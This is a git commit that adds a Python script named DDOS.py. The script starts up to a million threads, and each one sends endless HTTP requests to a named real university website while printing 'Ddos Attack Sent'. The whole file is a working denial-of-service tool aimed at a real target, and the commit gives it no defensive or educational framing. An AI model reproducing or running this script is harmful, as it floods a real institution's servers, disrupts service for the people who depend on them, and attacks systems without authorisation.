01524301bf8f607abb93097ee76c671ac230318a
MR RUBISH <150536726+rubish69@users.noreply.github.com>
2024-01-24 04:32:47 +0600

    Create DDOS.py

---
+++ DDOS.py
@@ -0,0 +1,23 @@
+import requests
+import threading
+
+
+def send_request():
+    try:
+        while True:
+            response = requests.get("https://www.bracu.ac.bd/")
+            print("\033[1;31mDdos Attack Sent💀")
+    except:
+        pass
+
+def start_ddos():
+    threads = []
+    for _ in range(1000000):
+        t = threading.Thread(target=send_request)
+        threads.append(t)
+        t.start()
+
+    for thread in threads:
+        thread.join()
+
+start_ddos()
